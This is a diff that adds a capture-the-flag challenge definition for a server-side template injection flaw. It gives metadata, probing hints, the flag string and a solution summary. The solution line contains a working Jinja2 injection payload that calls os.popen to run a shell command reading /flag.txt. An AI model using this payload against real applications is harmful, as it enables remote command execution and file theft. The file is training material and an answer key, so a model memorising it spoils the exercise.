@@ -1,0 +1,15 @@
+id: ssti-4
+title: "Server-Side Template Injection - Challenge 4"
+category: web
+difficulty: medium
+cvss: 8.5
+owasp: A03:2021 – Injection
+endpoint: /api/ssti/4
+description: "SSTI vulnerability in the name greeting template. User input is rendered by the template engine without sanitization."
+hints:
+  - "Test for template injection with {{7*7}} or {{7*'7'}}."
+  - "Identify the template engine (Jinja2, Freemarker, Pug, etc.)."
+  - "Access Python/Java objects to read file contents."
+flag: "BHEDA{ssti_challenge_4}"
+flag_location: "/flag.txt on the server filesystem"
+solution_summary: "Inject {{ config.__class__.__init__.__globals__['os'].popen('cat /flag.txt').read() }} to read the flag file."
